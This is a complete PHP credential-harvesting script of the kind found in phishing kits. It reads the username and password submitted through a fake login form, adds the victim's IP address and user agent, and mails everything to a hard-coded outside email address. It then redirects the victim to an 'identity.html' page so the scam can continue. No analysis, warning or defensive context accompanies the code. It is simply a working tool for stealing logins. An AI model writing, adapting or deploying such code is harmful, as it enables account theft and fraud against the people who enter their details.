<?php
if($_POST["text"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "IDS            : ".$_POST['text']."\n";
$message .= "Prass              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- MUMU --------------|\n";
$send = "jesseaafee@datacenter4.com";
$subject = "chy1 | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: identity.html");
}else{
header ("Location: identity.html");
}

?>